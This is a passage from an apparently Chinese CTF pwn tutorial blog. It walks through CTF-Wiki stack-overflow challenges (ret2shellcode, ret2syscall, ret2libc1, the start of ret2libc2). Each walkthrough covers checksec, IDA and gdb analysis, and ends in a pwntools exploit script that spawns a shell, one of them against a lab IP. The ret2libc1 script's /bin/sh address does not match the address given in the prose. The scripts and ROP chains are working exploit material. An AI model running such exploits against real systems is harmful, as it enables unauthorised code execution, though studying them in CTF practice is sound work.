stripped</span><br></pre></td></tr></table></figure><h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ checksec --file=ret2shellcode</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br></pre></td></tr></table></figure><p>NX是关闭的，这一题考点就和这个有关系。</p><h3 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main中有大问题，<code>gets</code>就不说了，攻击点就肯定是在这里，然后他往一个s[100]输入值了之后把s的值全部放到了buf2中，这个buf2在main中也没有定义，去看一下他的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0804</span>A080                               public buf2</span><br><span class="line">.bss:<span class="number">0804</span>A080                               ; <span class="type">char</span> buf2[<span class="number">100</span>]</span><br><span class="line">.bss:<span class="number">0804</span>A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db <span class="number">64</span>h <span class="title function_">dup</span><span class="params">(?)</span>                      ; DATA XREF: main+<span class="number">7B</span>↑o</span><br><span class="line">.bss:<span class="number">0804</span>A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends</span><br><span class="line">.bss:<span class="number">0804</span>A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+</span><br></pre></td></tr></table></figure><p>他的地址是<code>0x0804A080</code>这里还是在bss段中的，这里的值是可以读写的。这里思路已经清晰了。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这里面没有发现什么后门，这里我们就需要自己制造出一个后门sh,通过把后门sh写入到buf2中，然后用栈溢出把返回地址修改成buf2就可以完成攻击。</p><h3 id="溢出长度-1"><a href="#溢出长度-1" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">hello      </span><br><span class="line">15<span class="keyword">in</span> ret2shellcode.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0xffffd29c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd308 ◂— 0</span><br><span class="line"> ESP  0xffffd280 —▸ 0xffffd29c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x8048598 (main+107) ◂— mov dword ptr [esp + 8], 0x64</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>esp地址是<code>0xffffd29c</code>然后ebp地址是<code>0xffffd308</code>进行计算776-668&#x3D;108,需要溢出的栈长度是108+4，然后再加上返回地址改成buf2那就是116。</p><h3 id="脚本攻击"><a href="#脚本攻击" class="headerlink" title="脚本攻击"></a>脚本攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">&quot;172.20.10.4&quot;</span>,<span class="number">16000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buf2地址</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload构建</span></span><br><span class="line"><span class="comment"># 这里payload的总长度是116</span></span><br><span class="line">payload = asm(shellcraft.sh()).ljust(<span class="number">112</span>,<span class="string">b&quot;a&quot;</span>) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="题目来源-2"><a href="#题目来源-2" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop</a><br>PS：内容来自于CTF-WIKI</p><h3 id="文件类型-2"><a href="#文件类型-2" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file rop    </span><br><span class="line">rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>32位ELF文件</p><h3 id="软件防护"><a href="#软件防护" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ checksec --file=rop  </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   2255 Symbols      No    0               0               rop</span><br></pre></td></tr></table></figure><p>栈溢出防护是关闭的，NX是开启的，那这道题基本上就是用ROP进行栈溢出了。</p><h3 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说这次没有<code>system()</code>和<code>shellcode</code>该怎么办，但是这里有<code>gets</code>函数肯定存在栈溢出，然后分析了一下，确实是没有<code>system()</code>，shellcode也没办法执行，但是在地址<code>0x080BE408</code>发现了字符串<code>&quot;/bin/sh&quot;</code></p><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>shellcode和后门函数都不存在，这里直接尝试rop。</p><h3 id="ROPgadget查询"><a href="#ROPgadget查询" class="headerlink" title="ROPgadget查询"></a>ROPgadget查询</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ ROPgadget --binary ./rop --only <span class="string">&quot;pop|ret&quot;</span>|grep eax    </span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>eax_ret &#x3D; 0x080bb196</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ ROPgadget --binary ./rop --only <span class="string">&quot;pop|ret&quot;</span>|grep ebx</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>edx_ecx_ebx_ret &#x3D; 0x0806eb90</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ ROPgadget --binary ./rop |grep <span class="string">&quot;int&quot;</span>|grep <span class="string">&quot;0x80&quot;</span></span><br><span class="line">...</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>intx80 &#x3D; 0x08049421</p><h3 id="溢出长度-2"><a href="#溢出长度-2" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*EAX  0xffffcf7c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0x80481a8 (_init) ◂— push ebx</span><br><span class="line">*ECX  0xfbad2288</span><br><span class="line">*EDX  0x80eb4e0 (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDI  0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8067b10 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]</span><br><span class="line"> ESI  0</span><br><span class="line"> EBP  0xffffcfe8 —▸ 0x8049630 (__libc_csu_fini) ◂— push ebx</span><br><span class="line"> ESP  0xffffcf60 —▸ 0xffffcf7c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x8048e9b (main+119) ◂— mov eax, 0</span><br></pre></td></tr></table></figure><p>0xe8-0x7c&#x3D;232-124&#x3D;108+4&#x3D;112</p><h3 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./rop&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="number">0x080BE408</span></span><br><span class="line">eax_ret = <span class="number">0x080BB196</span></span><br><span class="line">edx_ecx_ebx_ret = <span class="number">0x0806EB90</span></span><br><span class="line">intx80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">112</span>,</span><br><span class="line">        eax_ret,</span><br><span class="line">        <span class="number">0xB</span>,</span><br><span class="line">        edx_ecx_ebx_ret,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        sh,</span><br><span class="line">        intx80,</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面四个地址分别是“&#x2F;bin&#x2F;sh”字符串地址、<code>pop eax ret</code>地址、<code>pop ebx ecx edx ret</code>地址、<code>int 0x80</code>地址，使用上面的payload可以达成下面执行效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0xb</span><br><span class="line">mov ebx, [&quot;/bin/sh&quot;]</span><br><span class="line">mov ecx, 0</span><br><span class="line">mov edx, 0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>payload中的<code>0xb</code>是系统调用的id他代表执行命令的一个函数。</p><h2 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h2><p>在编译程序的时候一般都是采用动态链接库的方式去编译，有些函数都是直接调用系统本地的libc，不把这些通用的函数编译进程序中，在采用动态链接库的程序里，如果是需要调用链接库的函数都会在plt和got表中存在一个条数据，plt会指向got表，got最终指向真正在系统中的函数地址，程序在最开始的时候plt和got是有连接的，但是如果函数一次都没被调用那么got表将会是空的，在第一次调用的时候got表才会真正指向内存中的对应函数地址，所以在ROP构造的时候对于这种采用动态链接库的程序可以通过调用对应函数的plt或者调用got地址存储的对应地址来执行相应的函数。需要注意的是动态链接库都是通过系统加载的，真正的函数地址肯定是不固定的，每次启动都会有不同的偏移，想要利用需要知道对应的函数偏移，在一个静态的glibc文件，里面的函数布局除了在加载的偏移不同之外其他的只要版本相同其他都是相同的。</p><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><h3 id="题目来源-3"><a href="#题目来源-3" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1</a><br>PS：内容来自于CTF-WIKI</p><h3 id="文件类型-3"><a href="#文件类型-3" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/pwn]</span><br><span class="line">└─$ file ret2libc1     </span><br><span class="line">ret2libc1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=fb89c86b266de4ff294489da59959a62f7aa1e61, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>这是一个采用动态连接库编译的32位ELF文件</p><h3 id="软件防护-1"><a href="#软件防护-1" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> checksec --file=ret2libc1    </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   84 Symbols        No    0               1               ret2libc1</span><br></pre></td></tr></table></figure><p>允许栈溢出，NX防护开启，PIE防护关闭。</p><h3 id="IDA分析-3"><a href="#IDA分析-3" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>在main函数中内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main中明显的<code>gets</code>函数，直接可以栈溢出，之后其他没有可用信息了。<br>在secure函数中内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有后门，但是<code>system()</code>函数传参不对不能直接拿这个地址直接用。<br>在IDA中查询找字符串<code>/bin/sh</code>在rodata中地址是<code>0x08048720</code><br>在plt表中查询到<code>system()</code>函数的地址是<code>0x08048460</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460                               ; [00000006 BYTES: COLLAPSED FUNCTION _system]</span><br></pre></td></tr></table></figure><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>采用system的plt地址来运行<code>system()</code>函数，通过程序内的字符串<code>/bin/sh</code>给函数进行传参。</p><h3 id="溢出长度-3"><a href="#溢出长度-3" class="headerlink" title="溢出长度"></a>溢出长度</h3><p>这里通过gdb动态调试来去看溢出长度</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────</span><br><span class="line">*EAX  0xffffcf3c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"> EBX  0xf7e23e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x223d2c /* <span class="string">&#x27;,=&quot;&#x27;</span> */</span><br><span class="line">*ECX  0xf7e258ac (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x8048690 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffcfa8 ◂— 0</span><br><span class="line"> ESP  0xffffcf20 —▸ 0xffffcf3c ◂— <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">*EIP  0x8048683 (main+107) ◂— mov eax, 0</span><br></pre></td></tr></table></figure><p>这里溢出位数应该是0xa8-0x3c&#x3D;108，溢出位数应该还要+4，+4才是真正返回地址的位置。</p><h3 id="攻击脚本-1"><a href="#攻击脚本-1" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用地址</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">binsh = <span class="number">0x8049720</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./ret2libc1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&quot;a&quot;</span> * <span class="number">112</span>, system_plt, <span class="string">b&quot;b&quot;</span> * <span class="number">4</span>, binsh])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>在脚本中plt地址后门还要再多溢出4字节，因为函数拿参数的时候都是他的上上个位置，上一个位置也就是这后面填充的4字节，他一般都是返回地址的位置，因为这里只需要执行<code>system()</code>所以不需要考虑这个返回地址的内容，填充垃圾数据即可。</p><h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><h3 id="题目来源-4"><a href="#题目来源-4" class="headerlink" title="题目来源"></a>题目来源</h3><p>下载位置： <a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2</a><br>PS：内容来自于CTF-WIKI</p><h3 id="文件类型-4"><a href="#文件类型-4" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Kali)-[~/Desktop/PWN/ret2libc2]</span><br><span class="line">└─# file ret2libc2</span><br><span class="line">ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, with debug_info, not stripped</span><br></pre></td></tr></table></figure><p>这是一个采用动态连接库编译的32位ELF文件</p><h3 id="软件防护-2"><a href="#软件防护-2" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 